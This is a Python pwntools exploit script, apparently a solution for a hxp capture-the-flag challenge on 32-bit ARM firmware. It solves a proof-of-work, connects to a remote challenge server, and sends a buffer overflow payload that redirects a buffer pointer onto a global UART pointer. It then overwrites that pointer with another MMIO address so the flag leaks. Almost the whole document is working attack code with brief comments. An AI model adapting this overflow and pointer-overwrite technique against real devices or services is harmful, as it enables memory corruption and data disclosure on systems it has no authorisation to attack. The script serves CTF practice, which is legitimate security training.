#!/usr/bin/env python3

from pwn import *

def solve_pow():
    import subprocess

    powl = r.recvline().decode()
    m = re.search(r'unhex\("([0-9a-fA-F]+)" \+ S\).*ends with (\d+)', powl)
    prefix = m.group(1)
    bits   = m.group(2)
    sol = subprocess.check_output(["./pow-solver", bits, prefix], text=True).strip()
    log.info("POW solved")
    r.sendline(sol.encode())

context.clear(arch="arm", bits=32, endian="little", os="linux")

r = remote("91.98.131.46", 1338)
solve_pow()
# r = process(["python", "start.py"], cwd="src/")

uart1 = 0x4000d000      # MMIO region
uart0_ptr = 0x20000000  # global variable

# the '\n' is required in order for fgets leave earlier

# redirect 'sbuf to 'uart0_ptr'
r.send(b"A"*0x8c + p32(uart0_ptr) + b"\n")
# from now on, any user input will write to 'uart0_ptr'

# replace UART0 MMIO address contained within 'uart0_ptr' with UART1's 
r.send(p32(uart1) + b"\n")

# parse received data for flag
r.recvuntil(b"hxp{")
flag = b"hxp{" + r.recvuntil(b"}")
log.info(f"Flag: {flag.decode()}")

r.close()
